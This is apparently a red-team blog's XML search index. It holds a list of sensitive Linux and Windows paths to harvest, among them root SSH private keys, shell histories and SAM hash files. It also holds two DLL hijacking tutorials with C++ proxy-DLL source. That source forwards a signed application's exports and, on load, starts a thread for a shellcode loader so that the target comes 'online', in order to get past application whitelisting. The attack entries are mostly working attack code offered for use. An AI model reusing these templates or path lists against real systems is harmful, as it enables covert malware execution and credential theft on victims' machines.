<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Sensitive path information concerns</title>
      <link href="2021/07/21/sensitive-path-information-concerns/"/>
      <url>2021/07/21/sensitive-path-information-concerns/</url>
      
        <content type="html"><![CDATA[<h6 id="If-there-is-insufficient-the-follow-up-to-continue"><a href="#If-there-is-insufficient-the-follow-up-to-continue" class="headerlink" title="If there is insufficient, the follow-up to continue"></a>If there is insufficient, the follow-up to continue</h6><h2 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h2><h3 id="apache-amp-apache2"><a href="#apache-amp-apache2" class="headerlink" title="apache&amp;apache2"></a>apache&amp;apache2</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;apache&#x2F;httpd.conf&#x2F;etc&#x2F;httpd&#x2F;conf&#x2F;httpd.conf&#x2F;etc&#x2F;httpd&#x2F;httpd.conf&#x2F;usr&#x2F;local&#x2F;apache&#x2F;conf&#x2F;httpd.conf&#x2F;home&#x2F;httpd&#x2F;conf&#x2F;httpd.conf&#x2F;usr&#x2F;local&#x2F;apache2&#x2F;conf&#x2F;httpd.conf&#x2F;usr&#x2F;local&#x2F;httpd&#x2F;conf&#x2F;httpd.conf&#x2F;etc&#x2F;rc.local &#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F;000-default.conf  web file&#x2F;etc&#x2F;apache2&#x2F;sites-enabled&#x2F; config file&#x2F;etc&#x2F;apache2&#x2F;sites-available&#x2F; all config file&#x2F;etc&#x2F;apache2&#x2F;apache2.conf Apache config file<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="nginx"><a href="#nginx" class="headerlink" title="nginx"></a>nginx</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;nginx&#x2F;nginx.conf&#x2F;etc&#x2F;nginx&#x2F;conf.d&#x2F;nginx.conf<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;proc&#x2F;mounts File system list&#x2F;proc&#x2F;cpuinfo CPU&#x2F;proc&#x2F;meminfo memory&#x2F;proc&#x2F;self -&gt; pid information&#x2F;proc&#x2F;self&#x2F;environ environment variable&#x2F;proc&#x2F;[pid]&#x2F;cmdline Process start parameter  such as &#x2F;proc&#x2F;1&#x2F;cmdline&#x2F;proc&#x2F;[pid]&#x2F;mountinfo Information about the file system mount&#x2F;proc&#x2F;[pid]&#x2F;fd&#x2F;[fd] The file that the process opened&#x2F;proc&#x2F;[pid]&#x2F;exe An exe file that points to the process&#x2F;proc&#x2F;config.gz<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;etc&#x2F;hosts.deny &#x2F;etc&#x2F;bashrc &#x2F;etc&#x2F;issue &#x2F;etc&#x2F;issue&#x2F;net &#x2F;etc&#x2F;ssh&#x2F;ssh_config &#x2F;etc&#x2F;termcap &#x2F;etc&#x2F;xinetd.d&#x2F;etc&#x2F;mtab &#x2F;etc&#x2F;vsftpd&#x2F;vsftpd.conf&#x2F;etc&#x2F;xinetd.conf &#x2F;etc&#x2F;protocols &#x2F;etc&#x2F;logrotate.conf &#x2F;etc&#x2F;ld.so.conf &#x2F;etc&#x2F;resolv.conf &#x2F;etc&#x2F;sysconfig&#x2F;network&#x2F;etc&#x2F;sendmail.cf&#x2F;etc&#x2F;sendmail.cw <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="Root-permission-required"><a href="#Root-permission-required" class="headerlink" title="Root permission required"></a>Root permission required</h3><pre class="line-numbers language-none"><code class="language-none">&#x2F;root&#x2F;.ssh&#x2F;authorized_keys&#x2F;root&#x2F;.ssh&#x2F;id_rsa&#x2F;root&#x2F;.ssh&#x2F;id_rsa.keystore&#x2F;root&#x2F;.ssh&#x2F;id_rsa.pub&#x2F;root&#x2F;.ssh&#x2F;known_hosts&#x2F;root&#x2F;.bash_history&#x2F;root&#x2F;.mysql_history<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h2><pre class="line-numbers language-none"><code class="language-none">c:\boot.inic:\windows\systems32\inetsrv\MetaBase.xmlc:\windows\repair\samC:\windows\system32\config\sam<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> Essays record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Information collection </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLL hijacking the whitelist application online</title>
      <link href="2021/07/20/dll-hijacking-the-whitelist-application-online/"/>
      <url>2021/07/20/dll-hijacking-the-whitelist-application-online/</url>
      
        <content type="html"><![CDATA[<h2 id="How-to-use"><a href="#How-to-use" class="headerlink" title="How to use"></a>How to use</h2><p>Application EXE unsigned white program, call their own compiled black DLL, here to QQ housekeeper function as a case, the implementation of the source code is as follows</p><pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">extern &quot;C&quot; __declspec(dllexport) void test();DWORD WINAPI DDOS(LPVOID lpParameter)&#123;your shellcode loader&#125;staticHMODULE g_OldModule &#x3D; NULL;VOID WINAPI Free()&#123;if (g_OldModule)&#123;FreeLibrary(g_OldModule);&#125;&#125;BOOL WINAPI Load()&#123;TCHAR tzPath[MAX_PATH];TCHAR tzTemp[MAX_PATH * 2];&#x2F;&#x2F;GetModuleFileName(NULL,tzPath,MAX_PATH); &#x2F;&#x2F;PathRemoveFileSpec(tzPath);GetSystemDirectory(tzPath, MAX_PATH); lstrcat(tzPath, TEXT(&quot;\\dllname.dll&quot;));g_OldModule &#x3D; LoadLibrary(tzPath);if (g_OldModule &#x3D;&#x3D; NULL)&#123;wsprintf(tzTemp, TEXT(&quot;无法找到模块 %s,程序无法正常运行&quot;), tzPath);MessageBox(NULL, tzTemp, TEXT(&quot;AheadLib&quot;), MB_ICONSTOP);&#125;return (g_OldModule !&#x3D; NULL);&#125;FARPROC WINAPI GetAddress(PCSTR pszProcName)&#123;FARPROC fpAddress;CHAR szProcName[64];TCHAR tzTemp[MAX_PATH];fpAddress &#x3D; GetProcAddress(g_OldModule, pszProcName);if (fpAddress &#x3D;&#x3D; NULL)&#123;if (HIWORD(pszProcName) &#x3D;&#x3D; 0)&#123;wsprintfA(szProcName, &quot;#%d&quot;, pszProcName);pszProcName &#x3D; szProcName;&#125;wsprintf(tzTemp, TEXT(&quot;无法找到函数 %hs,程序无法正常运行&quot;), pszProcName);MessageBox(NULL, tzTemp, TEXT(&quot;AheadLib&quot;), MB_ICONSTOP);ExitProcess(-2);&#125;return fpAddress;&#125;BOOL WINAPI Init()&#123;pfnAheadLib_GetVgaAllInfo &#x3D; GetAddress(&quot;GetVgaAllInfo&quot;);pfnAheadLib_GetVgaTemp &#x3D; GetAddress(&quot;GetVgaTemp&quot;);return TRUE;&#125;DWORD WINAPI ThreadProc(LPVOID lpThreadParameter)&#123;HANDLE hProcess;PVOID addr1 &#x3D; reinterpret_cast&lt;PVOID&gt;(0x00401000);BYTE data1[] &#x3D; &#123; 0x90, 0x90, 0x90, 0x90 &#125;;hProcess &#x3D; OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE, FALSE, GetCurrentProcessId());if (hProcess)&#123;WriteProcessMemory(hProcess, addr1, data1, sizeof(data1), NULL);CloseHandle(hProcess);&#125;return 0;&#125;BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, PVOID pvReserved)&#123;HANDLE threadHandle;threadHandle &#x3D; CreateThread(NULL, 0, DDOS, NULL, 0, NULL);if (dwReason &#x3D;&#x3D; DLL_PROCESS_ATTACH)&#123;DisableThreadLibraryCalls(hModule);if (Load() &amp;&amp; Init())&#123;TCHAR szAppName[MAX_PATH] &#x3D; TEXT(&quot;MyApp.exe&quot;);TCHAR szCurName[MAX_PATH];GetModuleFileName(NULL, szCurName, MAX_PATH);PathStripPath(szCurName);if (StrCmpI(szCurName, szAppName) &#x3D;&#x3D; 0)&#123;HANDLE hThread &#x3D; CreateThread(NULL, NULL, ThreadProc, NULL, NULL, NULL);if (hThread)&#123;CloseHandle(hThread);&#125;&#125;&#125;&#125;else if (dwReason &#x3D;&#x3D; DLL_PROCESS_DETACH)&#123;Free();&#125;return TRUE;&#125;EXTERN_C __declspec(naked) void __cdecl AheadLib_GetVgaAllInfo(void)&#123;__asm jmp pfnAheadLib_GetVgaAllInfo;&#125;EXTERN_C __declspec(naked) void __cdecl AheadLib_GetVgaTemp(void)&#123;__asm jmp pfnAheadLib_GetVgaTemp;&#125;void test()&#123;MessageBox(NULL, L&quot;XXX&quot;, L&quot;YYY&quot;, MB_OK);HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;dllname.dll&quot;);if (hDllInst)&#123;typedef DWORD(WINAPI *EXPFUNC)();EXPFUNC exportFunc &#x3D; NULL;exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);if (exportFunc)&#123;exportFunc();&#125;FreeLibrary(hDllInst);&#125;return;&#125;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Final-result"><a href="#Final-result" class="headerlink" title="Final result"></a>Final result</h2><p>Use the signed white program to call the black DLL successfully online the target machine</p><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20the%20whitelist%20application%20online/image.png" alt="image"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DLL hijacking from hijacking to on-line</title>
      <link href="2021/07/19/dll-hijacking-from-hijacking-to-on-line/"/>
      <url>2021/07/19/dll-hijacking-from-hijacking-to-on-line/</url>
      
        <content type="html"><![CDATA[<h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><pre class="line-numbers language-none"><code class="language-none">用中文写下理论知识，避免翻译的会看不懂了DLL（Dynamic Link Library），全称动态链接库，是Windows系统上程序正常运行必不可少的功能模块，是实现代码重用的具体形式。简单的说，可以把DLL理解成帮助程序完成各种功能的组件。DLL劫持，通过一些手段来劫持或者替换正常的DLL，从而加载编译好的恶意DLL漏洞成因，调用loadlibrary可使用DLL的相对路径，这是系统会按照特定的顺序搜索一些目录，便于确认DLL的路径，根据官方文档的定义，在使用相对路径调用loadlibrary时，系统会依次从下方6个路径去寻找所需要的DLL程序所在目录加载 DLL 时所在的当前目录系统目录即SYSTEM32目录16位系统目录即SYSTEM目录Windows目录PATH环境变量中列出的目录<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Easy-Study"><a href="#Easy-Study" class="headerlink" title="Easy Study"></a>Easy Study</h2><pre class="line-numbers language-none"><code class="language-none">A lot of basic grammar is required here, so I won&#39;t go into detail hereHere use forward to implementationProgram A calls the function in AAA.dll, now change the AAA.dll to AAA_o.dll, then write A new AAA.dll and forward the original function to AAA_o.dllThe DLL is as follows. You need to write an EXE to call the DLL and its functionsaaa.dllextern &quot;C&quot; __declspec(dllexport) void test();BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)&#123;switch (ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;void test() &#123;MessageBox(NULL, L&quot;aaa.dll success&quot;, L&quot;s&quot;, 0); &#125;the successful call has the following effect<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/1.png" alt="1"></p><pre class="line-numbers language-none"><code class="language-none">Take a look at the export function and confirm the test export function<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/2.png" alt="2"></p><pre class="line-numbers language-none"><code class="language-none">new dllextern &quot;C&quot; __declspec(dllexport) void test();BOOL APIENTRY DllMain(HMODULE hModule,DWORD ul_reason_for_call,LPVOID lpReserved)&#123;switch (ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:WinExec(&quot;calc.exe&quot;, SW_HIDE); case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;void test() &#123;MessageBox(NULL, L&quot;SUCCESS&quot;, L&quot;SSSSS&quot;, 0); HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;aaa_o.dll&quot;);if (hDllInst) &#123;typedef DWORD(WINAPI *EXPFUNC)();EXPFUNC exportFunc &#x3D; NULL;exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);if (exportFunc) &#123;exportFunc();&#125;FreeLibrary(hDllInst);&#125;return;&#125;The effect after hijacking is as followsA different way to use precompilation is much faster#pragma comment(linker, &quot;&#x2F;EXPORT:&lt;Function name&gt;&#x3D;&lt;Dll name&gt;.&lt;Function name&gt;&quot;)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/3.png" alt="3"></p><h2 id="How-to-Online"><a href="#How-to-Online" class="headerlink" title="How to Online"></a>How to Online</h2><pre class="line-numbers language-none"><code class="language-none">extern &quot;C&quot; __declspec(dllexport) void test();DWORD WINAPI DoSC(LPVOID lpParameter)&#123;Like you SC loader&#125;BOOL APIENTRY DllMain(HMODULE hModule,DWORD  ul_reason_for_call,LPVOID lpReserved)&#123;switch (ul_reason_for_call)&#123;case DLL_PROCESS_ATTACH:HANDLE threadHandle;threadHandle &#x3D; CreateThread(NULL, 0, DoSC, NULL, 0, NULL);break;case DLL_THREAD_ATTACH:case DLL_THREAD_DETACH:case DLL_PROCESS_DETACH:break;&#125;return TRUE;&#125;void test()&#123;MessageBox(NULL, L&quot;XXX&quot;, L&quot;YYY&quot;, 0);HINSTANCE hDllInst &#x3D; LoadLibrary(L&quot;aaa.dll&quot;);if (hDllInst)&#123;typedef DWORD(WINAPI *EXPFUNC)();EXPFUNC exportFunc &#x3D; NULL;exportFunc &#x3D; (EXPFUNC)GetProcAddress(hDllInst, &quot;test&quot;);if (exportFunc)&#123;exportFunc();&#125;FreeLibrary(hDllInst);&#125;return;&#125;You can do this<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://raw.githubusercontent.com/YangSirrr/Yangsir-blog-img/main/DLL%20hijacking%20from%20hijacking%20to%20on-line/4.png" alt="4"></p>]]></content>
      
      
      <categories>
          
          <category> Learning record </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redteam </tag>
            
            <tag> Bypass </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>最近太忙了，等过两天有空了开始更新！</title>
      <link href="2021/03/23/zui-jin-tai-mang-liao-deng-guo-liang-tian-you-kong-liao-kai-shi-geng-xin/"/>
      <url>2021/03/23/zui-jin-tai-mang-liao-deng-guo-liang-tian-you-kong-liao-kai-shi-geng-xin/</url>
      
        <content type="html"><![CDATA[<h2 id="博客暂未完全调试好，敬请期待"><a href="#博客暂未完全调试好，敬请期待" class="headerlink" title="博客暂未完全调试好，敬请期待"></a>博客暂未完全调试好，敬请期待</h2>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
